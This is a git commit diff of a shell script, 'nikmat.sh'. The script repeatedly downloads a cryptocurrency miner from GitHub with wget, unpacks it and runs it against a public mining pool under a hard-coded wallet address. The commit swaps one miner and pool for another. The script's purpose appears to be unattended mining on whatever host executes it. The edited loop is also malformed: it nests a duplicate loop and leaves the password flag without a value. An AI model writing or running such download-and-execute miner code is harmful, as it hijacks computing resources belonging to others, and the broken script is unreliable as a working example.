4cab96ece18b9503136a57ad7f4f6f48c666886b
verus0001 <91267202+verus0001@users.noreply.github.com>
2021-09-23 21:20:11 +0800

    Update nikmat.sh

--- nikmat.sh
+++ nikmat.sh
@@ -3,11 +3,16 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
-tar -xf violetminer-linux-v0.2.2.tar.gz
-cd violetminer-linux-v0.2.2
+COUNTER=20
+until [  $COUNTER -lt 10 ]; do
 
-./violetminer --pool rx-eu.unmineable.com:13333 --username SHIB:0x80c4210e8c0f6d37951a9078c713321e98a11ef5.Renita#rame-kb3u --password x --algorithm wrkzcoin
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-20 -n 1)Tester) -p --cpu 4
+
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+done
+
 
      echo COUNTER $COUNTER
      let COUNTER-=1
